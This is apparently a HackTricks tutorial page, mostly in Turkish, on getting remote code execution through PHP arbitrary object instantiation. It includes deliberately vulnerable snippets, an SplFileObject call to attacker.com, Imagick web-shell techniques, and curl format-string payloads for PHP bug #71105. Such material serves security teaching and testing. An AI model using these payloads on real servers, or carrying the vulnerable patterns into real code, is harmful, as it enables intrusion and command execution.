# PHP - RCE: nesne oluşturma suistimali: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

This is basically a summary of [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Giriş

Rastgele yeni nesnelerin oluşturulması, ör. `new $_GET["a"]($_GET["a"])`, Remote Code Execution (RCE)'ye yol açabilir; detaylar bir [**inceleme**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Bu belge RCE elde etmek için çeşitli stratejileri özetlemektedir.

## RCE: Özel Sınıflar veya Otomatik Yükleme ile

`new $a($b)` sözdizimi, bir nesne örneği oluşturmak için kullanılır; burada **`$a`** sınıf adını, **`$b`** ise konstruktöre geçirilen ilk argümanı temsil eder. Bu değişkenler GET/POST gibi kullanıcı girdilerinden (string veya dizi olabilir) veya JSON'dan (farklı tiplerde görünebilir) elde edilebilir.

Aşağıdaki kod parçasını düşünün:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
Bu durumda, `$a`'yı `App` veya `App2` olarak, `$b`'yi ise bir sistem komutu (ör. `uname -a`) olarak ayarlamak, o komutun çalıştırılmasıyla sonuçlanır.

**Autoloading functions** bu tür sınıflara doğrudan erişilemiyorsa kötüye kullanılabilir. Bu fonksiyonlar gerektiğinde dosyalardan sınıfları otomatik olarak yükler ve `spl_autoload_register` veya `__autoload` kullanılarak tanımlanır:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Autoloading davranışı PHP sürümlerine göre değişir ve farklı RCE olanakları sunar.

## Yerleşik Sınıflarla RCE

Özel sınıflar veya autoloader'lar yoksa, **yerleşik PHP sınıfları** RCE için yeterli olabilir. Bu sınıfların sayısı PHP sürümüne ve yüklü eklentilere bağlı olarak yaklaşık 100 ile 200 arasında değişir. `get_declared_classes()` kullanılarak listelenebilirler.

İlgili yapıcılar reflection API aracılığıyla tespit edilebilir; örnek ve bağlantı şu adreste gösterilmektedir: [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**Belirli yöntemlerle RCE şunları içerir:**

### **SSRF + Phar Deserialization**

`SplFileObject` sınıfı yapıcısı aracılığıyla SSRF'ye izin verir; herhangi bir URL'ye bağlantıya olanak tanır:
```php
new SplFileObject('http://attacker.com/');
```
SSRF, Phar protokolünü kullanarak PHP 8.0'dan önceki sürümlerde deserialization saldırılarına yol açabilir.

### **PDO'ların İstismarı**

PDO sınıfının yapıcı fonksiyonu, DSN strings aracılığıyla veritabanlarına bağlanmaya izin verir; bu da potansiyel olarak dosya oluşturma veya diğer etkileşimlere olanak sağlayabilir:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

PHP'in 5.3.22 ve 5.4.12'ye kadar olan sürümleri, libxml2 sürümüne bağlı olarak `SoapClient` ve `SimpleXMLElement` constructor'ları aracılığıyla XXE saldırılarına açıktı.

## RCE via Imagick Extension

Bir projenin **bağımlılıklarının** analizinde, yeni nesneler oluşturarak **Imagick**'in **komut çalıştırma** için kullanılabileceği keşfedildi. Bu, zafiyetlerin istismar edilmesi için bir fırsat sunar.

### VID parser

VID parser'ın dosya sistemindeki herhangi bir belirtilen yola içerik yazma yeteneği tespit edildi. Bu, bir PHP shell'in web'e erişilebilir bir dizine yerleştirilmesine ve Remote Code Execution (RCE) elde edilmesine yol açabilir.

#### VID Parser + File Upload

PHP'nin yüklenen dosyaları geçici olarak `/tmp/phpXXXXXX` içinde sakladığı not edildi. Imagick içindeki VID parser, **msl** protokolünü kullanarak dosya yollarındaki joker karakterleri işleyebilir ve böylece geçici dosyanın seçilen bir konuma taşınmasını sağlar. Bu yöntem, dosya sistemi içinde rastgele dosya yazma elde etmek için ek bir yol sunar.

### PHP Crash + Brute Force

[**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) içinde tanımlanan bir yöntem, silinmeden önce sunucu çökmesine neden olan dosyaların yüklenmesini içeriyor. Geçici dosyanın adını brute-forcing ile tahmin ederek, Imagick'in rastgele PHP kodu çalıştırması mümkün hale geliyor. Ancak bu teknik yalnızca eski bir ImageMagick sürümünde etkili bulundu.

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

Kullanıcı girdisi sınıf adını kontrol ettiğinde (ör. `new $_GET['model']()`), PHP 7.0.0 `Throwable` yeniden düzenlemesi sırasında geçici bir hata getirdi; motor çözümleme sırasında sınıf adını yanlışlıkla printf format string'i olarak ele aldı. Bu, PHP içinde klasik printf-style primitiflerin kullanılmasını sağlar: `%p` ile leaks, genişlik belirleyicileriyle yazma-sayısı kontrolü ve süreç içi işaretçilere (ör. ELF build'lerinde GOT kayıtlarına) karşı `%n` ile rastgele yazmalar.

Minimal reproducible zafiyet örneği:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
Exploitation outline (from the reference):
- Sınıf adında `%p` ile adresleri leak ederek yazılabilir bir hedef bulun:
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- Pozisyonel parametreleri ve genişlik belirticilerini kullanarak tam bir byte sayısı ayarlayın, sonra `%n` ile bu değeri yığın üzerinde erişilebilir bir adrese yazın; amaç bir GOT slotuna (ör. `free`) işaret ederek kısmi overwrite ile `system`'e çevirmek.
- Bir sınıf adı içinde bir shell pipe geçirerek hijacked fonksiyonu tetikleyin ve `system("id")`'ye ulaşın.

Notes:
- Works only on PHP 7.0.0 (Bug [#71105](https://bugs.php.net/bug.php?id=71105)); fixed in subsequent releases. Severity: critical if arbitrary class instantiation exists.
- Tipik payloads birçok `%p` zincirleyerek yığını gezer, sonra kısmi overwrite'ı gerçekleştirmek için `%.<width>d%<pos>$n` kullanır.

## References

- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../../banners/hacktricks-training.md}}
